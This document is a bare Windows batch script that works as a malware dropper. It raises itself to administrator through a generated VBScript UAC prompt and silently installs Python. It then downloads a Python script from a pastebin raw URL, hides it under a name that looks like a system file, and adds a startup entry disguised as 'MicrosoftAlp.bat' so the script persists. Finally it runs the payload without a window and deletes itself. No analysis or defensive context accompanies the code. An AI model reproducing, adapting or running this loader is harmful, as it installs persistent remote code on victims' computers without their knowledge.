@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/C %~s0 %*", "", "runas", 1 >> "%TEMP%\getadmin.vbs"
    
    "%TEMP%\getadmin.vbs"
    del "%TEMP%\getadmin.vbs"
    exit /b

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

set DOWNLOAD_DIR=%TEMP%
set PYTHON_SCRIPT_URL=https://pastebin.com/raw/A7Q5182y
set PYTHON_SCRIPT_NAME=Python3w.pyw
set PYTHON_SCRIPT_PATH=%DOWNLOAD_DIR%\%PYTHON_SCRIPT_NAME%
set STARTUP_BATCH_NAME=MicrosoftAlp.bat
set STARTUP_BATCH_PATH=%DOWNLOAD_DIR%\%STARTUP_BATCH_NAME%
set STARTUP_FOLDER="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Ensure the Temp directory exists
if not exist "%DOWNLOAD_DIR%" (
    mkdir "%DOWNLOAD_DIR%"
)

py --version >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (

    curl -o "%DOWNLOAD_DIR%\python-installer.exe" https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe

    "%DOWNLOAD_DIR%\python-installer.exe" /quiet InstallAllUsers=1 PrependPath=1

    py -m pip --version >nul 2>&1
    IF %ERRORLEVEL% NEQ 0 (
        pause
        exit /b 1
    )
) ELSE (
    echo Python is already installed
)

curl -o "%PYTHON_SCRIPT_PATH%" "%PYTHON_SCRIPT_URL%"

echo Creating startup batch file...
echo @echo off > "%STARTUP_BATCH_PATH%"
echo pyw "%PYTHON_SCRIPT_PATH%" >> "%STARTUP_BATCH_PATH%"

if exist %STARTUP_FOLDER% (
    move "%STARTUP_BATCH_PATH%" %STARTUP_FOLDER%
) else (
    pause
    exit /b 1
)

start pyw "%PYTHON_SCRIPT_PATH%"

:: Clean up
del "%~f0"

exit
